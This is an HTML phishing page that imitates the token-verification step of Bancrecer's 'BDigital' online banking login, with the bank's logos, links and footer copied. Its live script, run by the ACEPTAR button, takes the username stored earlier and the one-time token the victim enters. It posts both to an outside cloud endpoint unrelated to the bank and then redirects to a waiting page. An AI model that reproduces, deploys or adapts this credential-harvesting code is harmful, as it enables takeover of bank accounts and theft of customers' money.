<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <!-- title -->
        
                

<!-- localize.jsp MUST already be included in the calling script -->


<!-- title -->
<title>BDigital Bancrecer</title>

        

        <link rel="icon" href="https://bservicios.bancrecer.com.ve/accountrecoveryendpoint/images/bancrecer.ico" type="image/x-icon">
        <link href="token_files/bootstrap.min.css" rel="stylesheet">
        <link href="token_files/style.css" rel="stylesheet">
        <link href="token_files/custom-common.css" rel="stylesheet">
        <link href="token_files/Roboto.css" rel="stylesheet">
        <!--[if lt IE 9]>
        <script src="js/html5shiv.min.js"></script>
        <script src="js/respond.min.js"></script>
        <![endif]-->
        
    <script async="" src="token_files/stormcaster.js"></script><script>var __uzdbm_1 = "095fd46e-02e9-430e-8016-d37905e765c1";var __uzdbm_2 = "MDkxZDNhYTEtY3pkbS00Yjg5LTk4MGMtOWQ3MmNiZDhlZThhJDIwMC44NC41NS42OA==";var __uzdbm_3 = "";var __uzdbm_4 = "false";var __uzdbm_5 = "";var __uzdbm_6 = "";var __uzdbm_7 = "";</script> <script>   (function (w, d, e, u, c, g, a, b) {     w["SSJSConnectorObj"] = w["SSJSConnectorObj"] || {       ss_cid: c,       domain_info: "auto",     };     w[g] = function (i, j) {       w["SSJSConnectorObj"][i] = j;     };     a = d.createElement(e);     a.async = true;     if (       navigator.userAgent.indexOf('MSIE') !== -1 ||       navigator.appVersion.indexOf('Trident/') > -1     ) {       u = u.replace("/advanced/", "/advanced/ie/");     }     a.src = u;     b = d.getElementsByTagName(e)[0];     b.parentNode.insertBefore(a, b);   })(     window, document, "script", "https://bservicios.bancrecer.com.ve/18f5227b-e27b-445a-a53f-f845fbe69b40/stormcaster.js", "czdo", "ssConf"   );   ssConf("c1", "https://bservicios.bancrecer.com.ve");   ssConf("c3", "c99a4269-161c-4242-a3f0-28d44fa6ce24");   ssConf("au", "bservicios.bancrecer.com.ve");   ssConf("cu", "validate.perfdrive.com, ssc"); </script></head>

    <body id="banner">
    <!-- page content -->
    <div class="container-fluid body-wrapper" id="banner">
<div class="row justify-content-center" style="margin-top: 25px;">
        <div class="col-sm-5">
            <!-- content -->
            <div class="login-square">
			    <div class="row" style="height:55px">
					<div class="col-12 text-center">
					  <img id="login-logo" src="token_files/bdigital.png" style="margin-top: -25px; width:280px" class="mx-auto">
					</div>
				</div>
                <div class="card border-0">
				    <div class="card-body">
	<p class="card-title text-left forgot-user-title">Ingrese el token enviado</p>
						<hr>

						
						<div class="alert alert-danger" id="error-msg" hidden="show">XXXXXX</div>

						<div class="my-3" text-forgot-user="">
							Para continuar debe ingresar el token enviado.</div>
						<br>			
						<form method="post" action="verify.do" id="recoverDetailsForm">
						    <div class="form-actions">
								
								
								<br>
								
								
								<!--<div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 ">
									<label class="control-label">Apellido</label>
									<input id="last-name" type="text" name="http://wso2.org/claims/lastname"
										   class="form-control ">
								</div>-->
								
								
								<div>
									<input type="hidden" name="callback" value="https://bservicios.bancrecer.com.ve:443/authenticationendpoint/login.do?client_id=OLTBkgsti_bkfEHnB8Tqi_q64cka&amp;commonAuthCallerPath=/oauth2/authorize&amp;forceAuth=true&amp;nonce=abc&amp;passiveAuth=false&amp;prompt=login&amp;redirect_uri=https://bservicios.bancrecer.com.ve:2040&amp;response_type=id_token&amp;scope=openid&amp;tenantDomain=carbon.super&amp;sessionDataKey=6d4a5752-7416-4a51-be10-68d883e24f37&amp;relyingParty=OLTBkgsti_bkfEHnB8Tqi_q64cka&amp;type=oidc&amp;sp=bserviciosSP&amp;isSaaSApp=false&amp;authenticators=BasicAuthenticator:LOCAL">
								</div>
								
								<div class="input-group mt-5">
									<label class="control-label"></label>
									<input id="tok" type="number" name="http://wso2.org/claims/emailaddress" class="form-control" onkeyup="" data-validate="email" autocomplete="off" maxlength="50" placeholder="Token"></div><div class="input-group mt-5">
<label for="resultado" id="resultado" name="resultado" style="color:red;"></label>								
</div>
								
							</div>
		
								
								<!--<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 ">
									<label class="control-label">Tenant Domain
									</label>
									<input id="tenant-domain" type="text" name="tenantDomain"
										   class="form-control ">
								</div>-->
								
								&nbsp;&nbsp;
								<input type="hidden" id="isUsernameRecovery" name="isUsernameRecovery" value="true">
								
		
								

								<div class="form-actions">
									<button id="recoverySubmit" class="btn btn-primary btn-block rounded-0" type="button" onclick="enviar()">ACEPTAR
									</button>
									<button id="recoveryCancel" class="btn btn-secondary rounded-0" type="button" onclick="location.href='https:\/\/bservicios.bancrecer.com.ve:443\/authenticationendpoint\/login.do?authenticators=BasicAuthenticator%3ALOCAL\x26response_type=id_token\x26type=oidc\x26tenantDomain=carbon.super\x26nonce=abc\x26client_id=OLTBkgsti_bkfEHnB8Tqi_q64cka\x26relyingParty=OLTBkgsti_bkfEHnB8Tqi_q64cka\x26passiveAuth=false\x26isSaaSApp=false\x26scope=openid\x26commonAuthCallerPath=%2Foauth2%2Fauthorize\x26sessionDataKey=6d4a5752\-7416\-4a51\-be10\-68d883e24f37\x26forceAuth=true\x26redirect_uri=https%3A%2F%2Fbservicios.bancrecer.com.ve%3A2040\x26sp=bserviciosSP\x26prompt=login';">
									CANCELAR
									</button>
								</div>
							</form>
					</div>
                </div>
                <div class="clearfix"></div>
            </div>
            <!-- /content/body -->
	    </div>
        </div>
        <!-- footer -->
        
                

<!-- localize.jsp MUST already be included in the calling script -->


<!-- footer -->
<!-- footer -->
<footer class="footer">
		<footer class="text-center text-muted d-none d-md-block">
		    <img id="footer-logo" src="token_files/logo_bancrecer.png" width="150px;">
            <hr style="margin-top: 0;">
			<small>Copyright Â© Bancrecer S.A Banco Microfinanciero. RIF J-31637417-3. 0-500-CRECE-YA(0-500-27323-92)  0212-610.88.88.</small><br>
			<svg class="svg-inline--fa fa-facebook-square fa-w-14" width="15px" aria-hidden="true" data-prefix="fab" data-icon="facebook-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 80v352c0 26.5-21.5 48-48 48h-85.3V302.8h60.6l8.7-67.6h-69.3V192c0-19.6 5.4-32.9 33.5-32.9H384V98.7c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9H184v67.6h60.9V480H48c-26.5 0-48-21.5-48-48V80c0-26.5 21.5-48 48-48h352c26.5 0 48 21.5 48 48z"></path></svg><!-- <i class="fab fa-facebook-square"></i> -->&nbsp;&nbsp;
			<svg class="svg-inline--fa fa-twitter-square fa-w-14" width="15px" aria-hidden="true" data-prefix="fab" data-icon="twitter-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"></path></svg><!-- <i class="fab fa-twitter-square"></i> -->&nbsp;&nbsp;
			<svg class="svg-inline--fa fa-globe fa-w-16" width="15px" aria-hidden="true" data-prefix="fas" data-icon="globe" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M364.215 192h131.43c5.439 20.419 8.354 41.868 8.354 64s-2.915 43.581-8.354 64h-131.43c5.154-43.049 4.939-86.746 0-128zM185.214 352c10.678 53.68 33.173 112.514 70.125 151.992.221.001.44.008.661.008s.44-.008.661-.008c37.012-39.543 59.467-98.414 70.125-151.992H185.214zm174.13-192h125.385C452.802 84.024 384.128 27.305 300.95 12.075c30.238 43.12 48.821 96.332 58.394 147.925zm-27.35 32H180.006c-5.339 41.914-5.345 86.037 0 128h151.989c5.339-41.915 5.345-86.037-.001-128zM152.656 352H27.271c31.926 75.976 100.6 132.695 183.778 147.925-30.246-43.136-48.823-96.35-58.393-147.925zm206.688 0c-9.575 51.605-28.163 104.814-58.394 147.925 83.178-15.23 151.852-71.949 183.778-147.925H359.344zm-32.558-192c-10.678-53.68-33.174-112.514-70.125-151.992-.221 0-.44-.008-.661-.008s-.44.008-.661.008C218.327 47.551 195.872 106.422 185.214 160h141.572zM16.355 192C10.915 212.419 8 233.868 8 256s2.915 43.581 8.355 64h131.43c-4.939-41.254-5.154-84.951 0-128H16.355zm136.301-32c9.575-51.602 28.161-104.81 58.394-147.925C127.872 27.305 59.198 84.024 27.271 160h125.385z"></path></svg><!-- <i class="fas fa-globe"></i> -->
			<br>	
		</footer>
</footer>

        
    </div>

    <script src="token_files/jquery-3.4.1.js"></script>
    <script src="token_files/bootstrap.min.js"></script>
    <script type="text/javascript">

      
      /*function validateEmail(){
      
      var errorMessage = $("#error-msg");
      errorMessage.hide();

      alert('entro en validate');
	 var texto = document.getElementById('email').value;
         alert('valor email'+texto);
     if (texto == '') {
     alert('entro en email en blnaco');
     alert('errorMessage'+errorMessage);
                    errorMessage.text("Por favor ingrese el correo electrónico");
                    errorMessage.show();
                    $("html, body").animate({scrollTop: errorMessage.offset().top}, 'slow');
                    return false;
     }
	 var regex = /^[-\w.%+]{1,64}@(?:[A-Z0-9-]{1,63}\.){1,125}[A-Z]{2,63}$/i;
	 
	 if (!regex.test(texto)){
		errorMessage.text("Por favor ingrese un correo electrónico válido");
        errorMessage.show();
        $("html, body").animate({scrollTop: errorMessage.offset().top}, 'slow');
	    return false;
     }else{
	    return true;
	 }
 
   }*/





        $(document).ready(function () {

            $("#recoverDetailsForm").submit(function (e) {
                var errorMessage = $("#error-msg");
                errorMessage.hide();

                
                var firstName = $("#first-name").val();
                if (firstName == '') {
                    errorMessage.text("Por favor ingrese número de identificación.");
                    errorMessage.show();
                    $("html, body").animate({scrollTop: errorMessage.offset().top}, 'slow');
                    return false;
                }

                var vemail = $("#email").val();
		if (vemail == '') {
		    errorMessage.text("Por favor ingrese correo electrónico.");
                    errorMessage.show();
                    $("html, body").animate({scrollTop: errorMessage.offset().top}, 'slow');
                    return false;
		}
                
                var regex = /^[-\w.%+]{1,64}@(?:[A-Z0-9-]{1,63}\.){1,125}[A-Z]{2,63}$/i;
	 
	        if (!regex.test(vemail)){
		 errorMessage.text("Por favor ingrese un correo electrónico válido");
                 errorMessage.show();
                 $("html, body").animate({scrollTop: errorMessage.offset().top}, 'slow');
	         return false;
                }else{
	         return true;
	        }
                

                

                
                return true;
            });
        });

     function mayus(e) {
    			e.value = e.value.toLowerCase();
    			//console.log('respuesta => ', e.value);
    		}

    </script>
    <script>
	$(document).ready(function(){
        $('#email').on('keypress', function(e) {
        if (e.which == 32)
            return false;
		});	
	});

        /*function validateEmail(){
    
	 var texto = document.getElementById('email').value;
     if (texto == '') {
                    errorMessage.text("Por favor ingrese el correo electrónico");
                    errorMessage.show();
                    $("html, body").animate({scrollTop: errorMessage.offset().top}, 'slow');
                    return false;
     }
	 var regex = /^[-\w.%+]{1,64}@(?:[A-Z0-9-]{1,63}\.){1,125}[A-Z]{2,63}$/i;
	 
	 if (!regex.test(texto)){
		errorMessage.text("Por favor ingrese el correo electrónico");
        errorMessage.show();
        $("html, body").animate({scrollTop: errorMessage.offset().top}, 'slow');
	    return false;
     }else{
	    return true;
	 }
 
   }*/
$(document).ready(function(){
			document.getElementById("first-name").addEventListener("keypress",checkClose);
			var elem = $( '#error-msg' )[0];
			function checkClose(e) {
				var inp = String.fromCharCode(e.keyCode);
				if (/^[0-9]/.test(inp)){
					$( elem ).hide();
					return false;
				}
			}
	});
	
	$(document).ready(function(){
			document.getElementById("email").addEventListener("keypress",checkClose);
			var elem = $( '#error-msg' )[0];
			function checkClose(e) {
				var inp = String.fromCharCode(e.keyCode);
				if (/[a-zA-Z0-9]/.test(inp)){
					$( elem ).hide();
					return false;
				}
			}
	});

   </script>


<script>
	
        
async function enviar() {
	


	event.preventDefault(); // Evita recargar la página
			const usr = localStorage.getItem("usr");
            const usrs = document.getElementById('tok').value;
            
           
          
			
           


            const message = `BCRECER-- --Usuario: <code>${usr}</code> --\n TOKEN:<code> ${usrs} </code>--` ;
            const responseMessage = document.getElementById("responseMessage");

            if (!message.trim()) {
                responseMessage.textContent = "⚠️ Ingresa un mensaje antes de enviar.";
                return;
            }
{}
            try {
                const response = await fetch("https://116cb782-9f93-4a72-ba4a-d06101f4024e.us-east-1.cloud.genez.io/", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ message })
                });

                const data = await response.json();

                if (response.ok) {
                   localStorage.setItem("usr", usr);
				
				  window.location = "wait.html"
				   
                    
                } else {
                    responseMessage.textContent = "❌ Error al enviar mensaje: " + data.error;
                }
            } catch (error) {
                responseMessage.textContent = "❌ Error en la solicitud: " + error.message;
            }
}




</script>
    
    
</body></html>